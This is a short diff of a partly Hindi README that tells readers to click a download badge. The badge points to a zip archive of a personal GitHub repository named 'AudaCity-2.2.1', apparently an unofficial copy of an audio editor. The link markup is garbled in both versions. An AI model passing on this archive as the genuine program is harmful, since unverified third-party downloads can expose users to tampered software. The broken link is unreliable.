@@ -18,7 +18,7 @@
 बस नीचे दिए गए बटन पर क्लिक करें और डाउनलोड करें:
 
 <p align="center">
-  <a href="[blob:https://github.com/aa0f8878-e027-446b-9fb6-a4d82e698f30](https://github.com/AjitSinghDeveloper/AudaCity-2.2.1/archive/refs/heads/main.zip)">
+  <a href="blob:https://github.com/aa0f8878-e027-446b-9fb6-a4d82e698f30](https://github.com/AjitSinghDeveloper/AudaCity-2.2.1/archive/refs/heads/main.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20ZIP-23MB-brightgreen?style=for-the-badge&logo=download" />
   </a>
 </p>
